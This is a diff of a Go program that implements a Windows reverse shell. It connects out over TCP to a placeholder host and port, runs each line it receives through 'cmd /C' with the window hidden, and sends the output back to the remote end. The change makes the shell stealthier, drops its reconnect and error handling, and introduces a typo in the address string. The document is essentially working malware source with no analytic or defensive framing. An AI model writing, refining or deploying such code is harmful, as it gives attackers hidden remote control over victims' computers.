@@ -13,33 +13,27 @@ import (
     "os/exec"
     "syscall"
     "time"
+    "strings"
+    "fmt"
 )
 
 
 
-func reverse(host string) {
-    c, err := net.Dial("tcp", host)
-    if err != nil {
-        if c != nil {
-            c.Close()
-        }
-        time.Sleep(time.Minute)
-        reverse(host)
-    }
 
-    r := bufio.NewReader(c)
+func reverse(address string) {
+    conn, _ := net.Dial("tcp", address)
+    defer conn.Close()
+
+    reader := bufio.NewReader(conn)
     for {
-        order, err := r.ReadString('\n')
-        if err != nil {
-            c.Close()
-            reverse(host)
-            return
-        }
+        message, _ := reader.ReadString('\n')
 
-        cmd := exec.Command("cmd", "/C", order)
-        cmd.SysProcAttr = &syscall.SysProcAttr{}
-        out, _ := cmd.CombinedOutput()
-        c.Write(out)
+        cmdStr := strings.TrimSpace(message)
+        cmd := exec.Command("cmd", "/C", cmdStr)
+        cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+
+        output, _ := cmd.CombinedOutput()
+        fmt.Fprintf(conn, "%s\n", output)
     }
 }
 
@@ -68,6 +62,6 @@ func main() {
         _ = os.Remove(path)
     }(tmpFilePath)
 
-    reverse("[IP]:[PORT]")
+    reverse("[IP]]:[PORT]")
 
 }
